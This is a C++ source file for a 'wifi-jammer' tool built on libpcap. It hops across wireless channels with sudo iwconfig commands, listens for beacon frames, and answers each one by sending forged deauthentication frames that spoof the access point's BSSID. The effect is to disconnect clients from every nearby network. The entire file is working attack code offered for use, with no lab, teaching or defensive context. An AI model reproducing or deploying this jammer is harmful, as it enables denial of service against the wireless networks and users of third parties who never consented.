#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <thread>
#include <stdlib.h>
#include <unistd.h>
#include <algorithm>
#include <regex>
#include <iostream>
#include <sstream>
#include <vector>
#include "wireless.h"


void usage() {
    printf("syntax: wifi-jammer <interface>\n");
    printf("sample: wifi-jammer mon0\n");
}

typedef struct {
    char* dev_;
} Param;

Param param  = {
    .dev_ = NULL,
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 2) {
		usage();
		return false;
    }
    param->dev_ = argv[1];
    return true;
}

 int channel_hop(char *interface, std::vector<int> channels){
    std::string cmd;
    cmd = cmd + "sudo iwconfig " + std::string(interface) + " channel ";
    std::string cmd_with_channels;
    int i=0;
    if (channels.size() % 5 == 0){
        channels.push_back(1);
    }
    while(1){
        cmd_with_channels = cmd + std::to_string(channels[i]);
        system(cmd_with_channels.c_str());
        i += 5;
        if(i % channels.size() == 0) i=0;
        usleep(100000);
    }
}

std::string getResultFromCommand(std::string cmd){
    std::string result;
    FILE* stream;
    const int maxBuffer = 256;
    char buffer[maxBuffer];
    cmd.append(" 2>&1");

    stream = popen(cmd.c_str(), "r");
    if(stream){
        while(fgets(buffer, maxBuffer, stream) != NULL){
            result += buffer;
        }
    }
    pclose(stream);
    return result;
}

std::vector<int> getChannels(std::string input){
    std::string delimiter = "Channel ";
    int pos = 0;
    int npos = 0;
    std::vector<int> result;
    while((pos = input.find(delimiter)) != -1){     //sscanf(buf, "Channel %d : ", &channel); ??
        input.erase(0, pos + delimiter.length());
        if((npos = input.find(" : ")) != -1){
            result.push_back(std::stoi(input.substr(0, npos)));
        }
    }
    return result;
}


int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}

    std::string cmd;
    cmd = cmd + "sudo iwlist " + std::string(param.dev_) + " channel";
    std::vector<int> channels = getChannels(getResultFromCommand(cmd));     //get channel

    std::thread t1(channel_hop, param.dev_, channels);      //channel hopping
    t1.detach();

    PRadiotabHdr radio;
    PDot11Hdr dot11;
    SimpleRadiotapHdr deauthRadio;
    DeauthDot11Hdr deauthDot11;
    uint len = sizeof(SimpleRadiotapHdr) + sizeof(DeauthDot11Hdr);
    u_char* tmp = new u_char[len];

    memcpy(tmp, &deauthRadio, sizeof(SimpleRadiotapHdr));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        radio = (PRadiotabHdr)packet;
        packet += radio->hlen();
        dot11 = (PDot11Hdr)packet;
        if(dot11->type_ == 0b00 && dot11->subtype_ == 0b1000){          //beacon frame
            deauthDot11.bssid_ = dot11->bssid();
            deauthDot11.source_ = dot11->bssid();
            memcpy(tmp + sizeof(SimpleRadiotapHdr), &deauthDot11, sizeof(DeauthDot11Hdr));
            for(int i=0;i<2;i++){
            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(tmp), len);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                }
            }
        }
    }
    delete[] tmp;
    pcap_close(pcap);
}
